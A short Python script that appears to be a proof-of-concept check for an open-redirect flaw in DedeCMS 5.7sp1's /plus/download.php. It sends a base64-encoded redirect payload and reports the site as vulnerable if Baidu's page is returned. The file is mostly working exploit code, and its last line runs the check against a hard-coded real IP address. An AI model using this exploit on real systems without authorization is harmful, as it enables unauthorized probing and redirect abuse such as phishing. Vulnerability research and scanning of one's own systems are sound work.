#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms download.php重定向漏洞
referer: http://skyhome.cn/dedecms/357.html
author: Lucifer
description: 在dedecms 5.7sp1的/plus/download.php中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转。
'''
import requests
from termcolor import cprint

class Exploit:
    def attack(self, url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/download.php?open=1&link=aHR0cHM6Ly93d3cuYmFpZHUuY29t"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"www.baidu.com" in req.text:
                cprint("[+]存在dedecms download.php重定向漏洞...(低危)\tpayload: "+vulnurl, "blue")
                return '存在dedecms download.php重定向漏洞'

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")
print(Exploit().attack('http://113.207.111.129'))